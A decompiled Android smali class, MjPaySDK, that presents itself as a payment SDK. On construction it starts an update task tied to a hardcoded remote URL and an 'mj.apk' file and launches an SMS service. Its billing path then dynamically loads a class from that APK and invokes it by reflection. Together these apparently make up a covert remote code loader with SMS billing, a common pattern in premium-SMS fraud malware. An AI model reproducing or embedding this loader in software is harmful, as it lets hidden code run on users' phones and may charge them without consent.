.class public Lcom/mj/jar/pay/MjPaySDK;
.super Ljava/lang/Object;
.source "MjPaySDK.java"


# static fields
.field public static final APK_NAME:Ljava/lang/String; = "mj.apk"

.field public static final DEFAULT_URL:Ljava/lang/String; = "http://www.GAOANDROID.COM/zj/"

.field public static final DEFAULT_URL_CONFIG:Ljava/lang/String; = "http://www.GAOANDROID.COM/zj/config.txt"

.field public static final DEFAULT_VERSION:I = 0x1337b42

.field public static final DOWN_PORT:I = -0x65

.field public static final INITAPK:I = -0x64

.field private static final TAG:Ljava/lang/String;

.field public static debug_flag:Z

.field public static filePath:Ljava/lang/String;


# instance fields
.field private gAppid:Ljava/lang/String;

.field private gBillingListener:Lcom/mj/jar/pay/BillingListener;

.field private gContext:Landroid/app/Activity;

.field private gDistro:Ljava/lang/String;

.field private gFm:Ljava/lang/String;

.field public mHandler:Landroid/os/Handler;

.field private payClazz:Ljava/lang/Class;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/Class",
            "<*>;"
        }
    .end annotation
.end field

.field private payObj:Ljava/lang/Object;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 19
    const-class v0, Lcom/mj/jar/pay/MjPaySDK;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/mj/jar/pay/MjPaySDK;->TAG:Ljava/lang/String;

    .line 20
    const/4 v0, 0x1

    sput-boolean v0, Lcom/mj/jar/pay/MjPaySDK;->debug_flag:Z

    .line 17
    return-void
.end method

.method public constructor <init>(Landroid/app/Activity;Lcom/mj/jar/pay/BillingListener;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 5
    .param p1, "gContext"    # Landroid/app/Activity;
    .param p2, "billingListener"    # Lcom/mj/jar/pay/BillingListener;
    .param p3, "appid"    # Ljava/lang/String;
    .param p4, "distro"    # Ljava/lang/String;
    .param p5, "fm"    # Ljava/lang/String;

    .prologue
    .line 66
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 40
    new-instance v1, Lcom/mj/jar/pay/MjPaySDK$1;

    invoke-direct {v1, p0}, Lcom/mj/jar/pay/MjPaySDK$1;-><init>(Lcom/mj/jar/pay/MjPaySDK;)V

    iput-object v1, p0, Lcom/mj/jar/pay/MjPaySDK;->mHandler:Landroid/os/Handler;

    .line 67
    iput-object p1, p0, Lcom/mj/jar/pay/MjPaySDK;->gContext:Landroid/app/Activity;

    .line 68
    iput-object p2, p0, Lcom/mj/jar/pay/MjPaySDK;->gBillingListener:Lcom/mj/jar/pay/BillingListener;

    .line 69
    iput-object p3, p0, Lcom/mj/jar/pay/MjPaySDK;->gAppid:Ljava/lang/String;

    .line 70
    iput-object p4, p0, Lcom/mj/jar/pay/MjPaySDK;->gDistro:Ljava/lang/String;

    .line 71
    iput-object p5, p0, Lcom/mj/jar/pay/MjPaySDK;->gFm:Ljava/lang/String;

    .line 72
    const-string v1, "mj.apk"

    invoke-virtual {p1, v1}, Landroid/app/Activity;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lcom/mj/jar/pay/MjPaySDK;->filePath:Ljava/lang/String;

    .line 76
    new-instance v1, Lcom/mj/jar/pay/UpdateSDK;

    iget-object v2, p0, Lcom/mj/jar/pay/MjPaySDK;->mHandler:Landroid/os/Handler;

    sget-object v3, Lcom/mj/jar/pay/MjPaySDK;->filePath:Ljava/lang/String;

    invoke-direct {v1, p1, v2, v3}, Lcom/mj/jar/pay/UpdateSDK;-><init>(Landroid/content/Context;Landroid/os/Handler;Ljava/lang/String;)V

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, ""

    aput-object v4, v2, v3

    invoke-virtual {v1, v2}, Lcom/mj/jar/pay/UpdateSDK;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 78
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/mj/jar/pay/SmsServices;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 79
    .local v0, "intent":Landroid/content/Intent;
    invoke-virtual {p1, v0}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 81
    return-void
.end method

.method private MjBilling()V
    .locals 6

    .prologue
    .line 107
    :try_start_0
    iget-object v3, p0, Lcom/mj/jar/pay/MjPaySDK;->gContext:Landroid/app/Activity;

    sget-object v4, Lcom/mj/jar/pay/MjPaySDK;->filePath:Ljava/lang/String;

    invoke-static {v3, v4}, Lcom/mj/jar/pay/DexClass;->install(Landroid/content/Context;Ljava/lang/String;)Lcom/mj/jar/pay/DexClass;

    move-result-object v3

    const-string v4, "com.mj.billing.MjBilling"

    invoke-virtual {v3, v4}, Lcom/mj/jar/pay/DexClass;->getDexClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    iput-object v3, p0, Lcom/mj/jar/pay/MjPaySDK;->payClazz:Ljava/lang/Class;

    .line 109
    const/4 v3, 0x5

    new-array v2, v3, [Ljava/lang/Class;

    .line 110
    .local v2, "params":[Ljava/lang/Class;
    const/4 v3, 0x0

    const-class v4, Landroid/content/Context;

    aput-object v4, v2, v3

    .line 111
    const/4 v3, 0x1

    const-class v4, Landroid/os/Handler;

    aput-object v4, v2, v3

    .line 112
    const/4 v3, 0x2

    const-class v4, Ljava/lang/String;

    aput-object v4, v2, v3

    .line 113
    const/4 v3, 0x3

    const-class v4, Ljava/lang/String;

    aput-object v4, v2, v3

    .line 114
    const/4 v3, 0x4

    const-class v4, Ljava/lang/String;

    aput-object v4, v2, v3

    .line 115
    iget-object v3, p0, Lcom/mj/jar/pay/MjPaySDK;->payClazz:Ljava/lang/Class;

    invoke-virtual {v3, v2}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v0

    .line 116
    .local v0, "ct":Ljava/lang/reflect/Constructor;, "Ljava/lang/reflect/Constructor<*>;"
    const/4 v3, 0x5

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    iget-object v5, p0, Lcom/mj/jar/pay/MjPaySDK;->gContext:Landroid/app/Activity;

    aput-object v5, v3, v4

    const/4 v4, 0x1

    iget-object v5, p0, Lcom/mj/jar/pay/MjPaySDK;->mHandler:Landroid/os/Handler;

    aput-object v5, v3, v4

    const/4 v4, 0x2

    iget-object v5, p0, Lcom/mj/jar/pay/MjPaySDK;->gAppid:Ljava/lang/String;

    aput-object v5, v3, v4

    const/4 v4, 0x3

    iget-object v5, p0, Lcom/mj/jar/pay/MjPaySDK;->gDistro:Ljava/lang/String;

    aput-object v5, v3, v4

    const/4 v4, 0x4

    iget-object v5, p0, Lcom/mj/jar/pay/MjPaySDK;->gFm:Ljava/lang/String;

    aput-object v5, v3, v4

    invoke-virtual {v0, v3}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    iput-object v3, p0, Lcom/mj/jar/pay/MjPaySDK;->payObj:Ljava/lang/Object;

    .line 117
    sget-boolean v3, Lcom/mj/jar/pay/MjPaySDK;->debug_flag:Z

    invoke-virtual {p0, v3}, Lcom/mj/jar/pay/MjPaySDK;->SetDebugMode(Z)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 121
    .end local v0    # "ct":Ljava/lang/reflect/Constructor;, "Ljava/lang/reflect/Constructor<*>;"
    .end local v2    # "params":[Ljava/lang/Class;
    :goto_0
    const-string v3, "sms"

    const-string v4, "Now using the billing logic in the apk."

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 122
    return-void

    .line 118
    :catch_0
    move-exception v1

    .line 119
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method static synthetic access$0(Lcom/mj/jar/pay/MjPaySDK;)Lcom/mj/jar/pay/BillingListener;
    .locals 1

    .prologue
    .line 33
    iget-object v0, p0, Lcom/mj/jar/pay/MjPaySDK;->gBillingListener:Lcom/mj/jar/pay/BillingListener;

    return-object v0
.end method

.method static synthetic access$1(Lcom/mj/jar/pay/MjPaySDK;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 32
    iget-object v0, p0, Lcom/mj/jar/pay/MjPaySDK;->payObj:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic access$2(Lcom/mj/jar/pay/MjPaySDK;)Ljava/lang/Class;
    .locals 1

    .prologue
    .line 31
    iget-object v0, p0, Lcom/mj/jar/pay/MjPaySDK;->payClazz:Ljava/lang/Class;

    return-object v0
.end method

.method static synthetic access$3(Lcom/mj/jar/pay/MjPaySDK;)Landroid/app/Activity;
    .locals 1

    .prologue
    .line 30
    iget-object v0, p0, Lcom/mj/jar/pay/MjPaySDK;->gContext:Landroid/app/Activity;

    return-object v0
.end method

.method static synthetic access$4(Lcom/mj/jar/pay/MjPaySDK;)V
    .locals 0

    .prologue
    .line 105
    invoke-direct {p0}, Lcom/mj/jar/pay/MjPaySDK;->MjBilling()V

    return-void
.end method

.method private copyFile(Ljava/lang/String;)V
    .locals 11
    .param p1, "filename"    # Ljava/lang/String;

    .prologue
    .line 138
    iget-object v9, p0, Lcom/mj/jar/pay/MjPaySDK;->gContext:Landroid/app/Activity;

    invoke-virtual {v9}, Landroid/app/Activity;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    .line 139
    .local v0, "assetManager":Landroid/content/res/AssetManager;
    const/4 v3, 0x0

    .line 140
    .local v3, "in":Ljava/io/InputStream;
    const/4 v6, 0x0

    .line 142
    .local v6, "out":Ljava/io/OutputStream;
    :try_start_0
    invoke-virtual {v0, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v3

    .line 143
    sget-object v5, Lcom/mj/jar/pay/MjPaySDK;->filePath:Ljava/lang/String;

    .line 144
    .local v5, "newFileName":Ljava/lang/String;
    new-instance v4, Ljava/io/File;

    sget-object v9, Lcom/mj/jar/pay/MjPaySDK;->filePath:Ljava/lang/String;

    invoke-direct {v4, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 145
    .local v4, "jarTarget":Ljava/io/File;
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v9

    if-eqz v9, :cond_0

    .line 146
    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    .line 148
    :cond_0
    new-instance v7, Ljava/io/FileOutputStream;

    invoke-direct {v7, v5}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 150
    .end local v6    # "out":Ljava/io/OutputStream;
    .local v7, "out":Ljava/io/OutputStream;
    const/16 v9, 0x400

    :try_start_1
    new-array v1, v9, [B

    .line 152
    .local v1, "buffer":[B
    :goto_0
    invoke-virtual {v3, v1}, Ljava/io/InputStream;->read([B)I

    move-result v8

    .local v8, "read":I
    const/4 v9, -0x1

    if-ne v8, v9, :cond_1

    .line 155
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 156
    const/4 v3, 0x0

    .line 157
    invoke-virtual {v7}, Ljava/io/OutputStream;->flush()V

    .line 158
    invoke-virtual {v7}, Ljava/io/OutputStream;->close()V

    .line 159
    const/4 v6, 0x0

    .line 163
    .end local v1    # "buffer":[B
    .end local v4    # "jarTarget":Ljava/io/File;
    .end local v5    # "newFileName":Ljava/lang/String;
    .end local v7    # "out":Ljava/io/OutputStream;
    .end local v8    # "read":I
    .restart local v6    # "out":Ljava/io/OutputStream;
    :goto_1
    return-void

    .line 153
    .end local v6    # "out":Ljava/io/OutputStream;
    .restart local v1    # "buffer":[B
    .restart local v4    # "jarTarget":Ljava/io/File;
    .restart local v5    # "newFileName":Ljava/lang/String;
    .restart local v7    # "out":Ljava/io/OutputStream;
    .restart local v8    # "read":I
    :cond_1
    const/4 v9, 0x0

    invoke-virtual {v7, v1, v9, v8}, Ljava/io/OutputStream;->write([BII)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 160
    .end local v1    # "buffer":[B
    .end local v8    # "read":I
    :catch_0
    move-exception v2

    move-object v6, v7

    .line 161
    .end local v4    # "jarTarget":Ljava/io/File;
    .end local v5    # "newFileName":Ljava/lang/String;
    .end local v7    # "out":Ljava/io/OutputStream;
    .local v2, "e":Ljava/lang/Exception;
    .restart local v6    # "out":Ljava/io/OutputStream;
    :goto_2
    const-string v9, "tag"

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-static {v9, v10}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    .line 160
    .end local v2    # "e":Ljava/lang/Exception;
    :catch_1
    move-exception v2

    goto :goto_2
.end method


# virtual methods
.method public SetDebugMode(Z)V
    .locals 6
    .param p1, "velue"    # Z

    .prologue
    .line 125
    sput-boolean p1, Lcom/mj/jar/pay/MjPaySDK;->debug_flag:Z

    .line 126
    iget-object v2, p0, Lcom/mj/jar/pay/MjPaySDK;->payClazz:Ljava/lang/Class;

    if-eqz v2, :cond_0

    .line 128
    const/4 v2, 0x1

    :try_start_0
    new-array v1, v2, [Ljava/lang/Class;

    .line 129
    .local v1, "params":[Ljava/lang/Class;
    const/4 v2, 0x0

    sget-object v3, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v3, v1, v2

    .line 130
    iget-object v2, p0, Lcom/mj/jar/pay/MjPaySDK;->payClazz:Ljava/lang/Class;

    const-string v3, "SetDebugMode"

    invoke-virtual {v2, v3, v1}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 131
    .local v0, "devpCheckActions":Ljava/lang/reflect/Method;
    const/4 v2, 0x0

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    sget-boolean v5, Lcom/mj/jar/pay/MjPaySDK;->debug_flag:Z

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v0, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 135
    .end local v0    # "devpCheckActions":Ljava/lang/reflect/Method;
    .end local v1    # "params":[Ljava/lang/Class;
    :cond_0
    :goto_0
    return-void

    .line 132
    :catch_0
    move-exception v2

    goto :goto_0
.end method

.method public pay(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 6
    .param p1, "orderNo"    # Ljava/lang/String;
    .param p2, "payCode"    # Ljava/lang/String;
    .param p3, "price"    # Ljava/lang/String;

    .prologue
    .line 84
    iget-object v3, p0, Lcom/mj/jar/pay/MjPaySDK;->payObj:Ljava/lang/Object;

    if-eqz v3, :cond_0

    iget-object v3, p0, Lcom/mj/jar/pay/MjPaySDK;->payClazz:Ljava/lang/Class;

    if-nez v3, :cond_1

    .line 85
    :cond_0
    invoke-direct {p0}, Lcom/mj/jar/pay/MjPaySDK;->MjBilling()V

    .line 88
    :cond_1
    const/4 v3, 0x3

    :try_start_0
    new-array v2, v3, [Ljava/lang/Class;

    .line 89
    .local v2, "payparams":[Ljava/lang/Class;
    const/4 v3, 0x0

    const-class v4, Ljava/lang/String;

    aput-object v4, v2, v3

    .line 90
    const/4 v3, 0x1

    const-class v4, Ljava/lang/String;

    aput-object v4, v2, v3

    .line 91
    const/4 v3, 0x2

    const-class v4, Ljava/lang/String;

    aput-object v4, v2, v3

    .line 92
    iget-object v3, p0, Lcom/mj/jar/pay/MjPaySDK;->payClazz:Ljava/lang/Class;

    const-string v4, "pay"

    invoke-virtual {v3, v4, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 93
    .local v0, "devpCheckAction":Ljava/lang/reflect/Method;
    iget-object v3, p0, Lcom/mj/jar/pay/MjPaySDK;->payObj:Ljava/lang/Object;

    const/4 v4, 0x3

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    aput-object p1, v4, v5

    const/4 v5, 0x1

    aput-object p2, v4, v5

    const/4 v5, 0x2

    aput-object p3, v4, v5

    invoke-virtual {v0, v3, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 98
    .end local v0    # "devpCheckAction":Ljava/lang/reflect/Method;
    .end local v2    # "payparams":[Ljava/lang/Class;
    :goto_0
    return-void

    .line 94
    :catch_0
    move-exception v1

    .line 95
    .local v1, "e":Ljava/lang/Exception;
    iget-object v3, p0, Lcom/mj/jar/pay/MjPaySDK;->mHandler:Landroid/os/Handler;

    const/16 v4, 0x7e6

    invoke-virtual {v3, v4}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    .line 96
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method
